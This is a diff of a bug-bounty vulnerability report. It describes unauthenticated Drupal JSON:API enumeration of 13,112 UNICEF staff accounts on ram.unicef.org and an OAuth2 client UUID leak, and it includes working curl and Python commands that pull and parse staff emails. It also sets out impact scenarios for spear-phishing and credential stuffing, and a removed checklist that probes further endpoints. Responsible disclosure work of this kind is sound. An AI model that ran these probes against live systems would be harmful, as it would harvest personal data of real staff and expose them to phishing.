@@ -81,24 +81,22 @@ curl -s "https://ram.unicef.org/en/jsonapi" \
 ### Step 2: Enumerate Staff User Accounts
 
 ```bash
-curl -s "https://ram.unicef.org/en/jsonapi/user/user?page[limit]=50" \
-  -H "Accept: application/vnd.api+json" | python3 -c "
-import sys, json
-d = json.loads(sys.stdin.read())
+curl -s "https://ram.unicef.org/en/jsonapi/user/user?page%5Blimit%5D=50" \
+  -H "Accept: application/vnd.api+json" > /tmp/users.json
+
+python3 - <<'PYEOF'
+import json
+d = json.load(open('/tmp/users.json'))
 data = d.get('data', [])
-print(f'Users returned: {len(data)}')
-print(f'Total count: {d.get(\"meta\", {}).get(\"count\", \"N/A\")}')
+print(f'Records on this page: {len(data)}')
+print(f'Pagination next: {d.get("links",{}).get("next",{}).get("href","none")}')
 for u in data[:10]:
-    attrs = u.get('attributes', {})
-    print(f'  UUID: {u[\"id\"]}')
-    print(f'  Name: {attrs.get(\"name\",\"\")}')
-    print(f'  Mail: {attrs.get(\"mail\",\"\")}')
-    print()
-"
+    print(f'  {u["id"]}  {u["attributes"].get("display_name","")}')
+PYEOF
 ```
 
-**Expected result:** HTTP 200 with paginated list of UNICEF staff accounts including
-`@unicef.org` email addresses and internal UUIDs.
+**Expected result:** HTTP 200 with paginated records. `display_name` field contains
+real `@unicef.org` email addresses. Pagination continues for 263 pages (13,112 total).
 
 ### Step 3: Probe OAuth2 Endpoint (Escalation Check)
 
@@ -211,36 +209,32 @@ All three components are past end-of-life and receive no security patches.
 
 ## Impact
 
-**Confirmed:**
-1. **Complete Global Staff Directory Exposed (13,112 accounts):** The entire user
+1. **Complete Global Staff Directory (13,112 accounts):** The entire user
    database of the RAM 3.0 platform is readable by any unauthenticated attacker in
    under 5 minutes. This represents the complete enumeration of UNICEF's global
    operational staff — country offices, headquarters, and regional personnel — with
    no authentication, no CAPTCHA, and no rate limiting.
 
-2. **User UUID Disclosure:** Every account's Drupal UUID is returned alongside the
+2. **Targeted Spear-Phishing at Scale:** 13,112 validated `@unicef.org` email
+   addresses from an official UNICEF subdomain. An attacker can target humanitarian
+   workers in conflict zones, beneficiary program staff, and UNICEF leadership with
+   personalized phishing campaigns backed by a verified address list.
+
+3. **Credential Stuffing Enablement:** Confirmed email directory enables credential
+   stuffing against UNICEF SSO, Outlook 365, VPN portals, and any service sharing
+   the unicef.org identity provider. Scale (13K+ accounts) makes this statistically
+   likely to yield valid credential pairs against publicly known breach databases.
+
+4. **User UUID Disclosure:** Every account's Drupal UUID is returned alongside the
    email. UUIDs are stable identifiers enabling targeted subsequent API requests
    (user-specific content, relationship traversal, targeted permission checks).
 
-3. **Massive Spear-Phishing Attack Surface:** 13,112 validated `@unicef.org` email
-   addresses from an official UNICEF subdomain. An attacker can target humanitarian
-   workers in conflict zones, beneficiary program staff, and UNICEF leadership with
-   personalized phishing campaigns.
-
-4. **Credential Stuffing Enablement:** Confirmed email directory enables credential
-   stuffing against UNICEF SSO, Outlook 365, VPN portals, and any service sharing
-   the unicef.org identity provider. Scale (13K+ accounts) makes this statistically
-   likely to yield valid credential pairs if breached password lists are used.
-
-**Confirmed (additional):**
-4. **OAuth2 Client UUID Disclosure via JSON:API `meta.omitted`:** Probing
+5. **OAuth2 Client UUID Disclosure via `meta.omitted`:** Probing
    `/en/jsonapi/oauth2_server_client/oauth2_server_client` unauthenticated returns
    HTTP 200 with `data: []` but leaks the OAuth2 client UUID in the `meta.omitted`
    section (Drupal's partial-result disclosure mechanism). Confirmed leaked UUID:
-   `8cf614c1-7422-477b-952b-bcf1642439c5`. An attacker can reconstruct the full
-   client URL: `ram.unicef.org/en/jsonapi/oauth2_server_client/oauth2_server_client/8cf614c1-7422-477b-952b-bcf1642439c5`.
-   The actual client secret is not returned — but the existence and UUID of each
-   OAuth2 client is disclosed without authentication.
+   `8cf614c1-7422-477b-952b-bcf1642439c5`. The actual client secret is not returned,
+   but the existence and UUID of each OAuth2 client is disclosed without authentication.
 
    Raw response excerpt:
    ```json
@@ -262,8 +256,9 @@ All three components are past end-of-life and receive no security patches.
    }
    ```
 
-5. **Internal Configuration Exposure:** `config_pages--api_config` and
-   `config_pages--api_modules` endpoints listed in schema — content not yet probed.
+6. **Internal Configuration Endpoints Exposed in Schema:** `config_pages--api_config`,
+   `config_pages--api_modules`, and `consumer--consumer` are listed in the
+   unauthenticated schema. Content not probed — flag for platform team audit.
 
 ---
 
@@ -321,69 +316,6 @@ No partial access: every record in the user table is readable by any unauthentic
 
 ---
 
-## Section 6 — Pre-Submission Verification Checklist (Run on Pi)
-
-```bash
-# Create evidence directory first
-mkdir -p ~/bug-bounty-hunting-/results/unicef.org/findings/
-
-cd ~/bug-bounty-hunting-
-
-# 1. Full user count + sample — save response to file first, then parse
-curl -s "https://ram.unicef.org/en/jsonapi/user/user?page%5Blimit%5D=50" \
-  -H "Accept: application/vnd.api+json" \
-  > /tmp/jsonapi-users.json
-
-python3 - <<'PYEOF'
-import json
-with open('/tmp/jsonapi-users.json') as f:
-    d = json.load(f)
-data = d.get('data', [])
-meta = d.get('meta', {})
-print(f'Total (meta.count): {meta.get("count", "N/A")}')
-print(f'Users this page: {len(data)}')
-print()
-for u in data[:5]:
-    a = u.get('attributes', {})
-    print(f'  name={a.get("name","")} | mail={a.get("mail","")} | uuid={u["id"][:8]}...')
-PYEOF
-
-cp /tmp/jsonapi-users.json results/unicef.org/findings/poc-user-count.json
-
-# 2. OAuth2 token probe (check if active tokens leak)
-curl -s "https://ram.unicef.org/en/jsonapi/oauth2_server_token/oauth2_server_token" \
-  -H "Accept: application/vnd.api+json" \
-  > /tmp/oauth2-token.json
-echo "HTTP status:" $(curl -so /dev/null -w "%{http_code}" \
-  "https://ram.unicef.org/en/jsonapi/oauth2_server_token/oauth2_server_token" \
-  -H "Accept: application/vnd.api+json")
-python3 -c "import json,sys; d=json.load(open('/tmp/oauth2-token.json')); print('data count:', len(d.get('data',[])), '| omitted:', bool(d.get('meta',{}).get('omitted')))"
-cp /tmp/oauth2-token.json results/unicef.org/findings/poc-oauth2-token.json
-
-# 3. API config probe
-curl -s "https://ram.unicef.org/en/jsonapi/config_pages/api_config" \
-  -H "Accept: application/vnd.api+json" \
-  > /tmp/api-config.json
-echo "HTTP status:" $(curl -so /dev/null -w "%{http_code}" \
-  "https://ram.unicef.org/en/jsonapi/config_pages/api_config" \
-  -H "Accept: application/vnd.api+json")
-python3 -c "import json; d=json.load(open('/tmp/api-config.json')); print('data count:', len(d.get('data',[])), '| omitted:', bool(d.get('meta',{}).get('omitted')))"
-cp /tmp/api-config.json results/unicef.org/findings/poc-api-config.json
-
-# 4. Save schema
-curl -s "https://ram.unicef.org/en/jsonapi" \
-  -H "Accept: application/vnd.api+json" \
-  > results/unicef.org/findings/poc-schema-full.json
-echo "Schema saved: $(wc -c < results/unicef.org/findings/poc-schema-full.json) bytes"
-```
-
-**Decision gate:**
-- oauth2_server_token returns `data:[...]` with content → **High — add to report before submitting**
-- oauth2_server_token returns `data:[]` with omitted → **Medium — UUID leak only, submit as-is**
-- Any probe returns actual API keys/secrets → **Critical — submit same day**
-
----
-
 ## Deduplication
 
 - Searched: `ram.unicef.org jsonapi site:hackerone.com OR site:bugcrowd.com OR site:github.com`
@@ -399,6 +331,7 @@ Status: **Not a known duplicate**
 ## Submission Draft
 
 **To:** infosecurity@unicef.org  
-**Subject:** Vulnerability Report: Unauthenticated User Enumeration via Drupal JSON:API on ram.unicef.org
+**Subject:** Vulnerability Report: Unauthenticated Bulk Disclosure of 13,112 Staff Email Addresses via Drupal JSON:API on ram.unicef.org  
+**Attach:** `findings/poc-F001-unicef-jsonapi-disclosure.py`
 
 See `findings/submission/F001-unicef-email-report.md` for the ready-to-send email body.
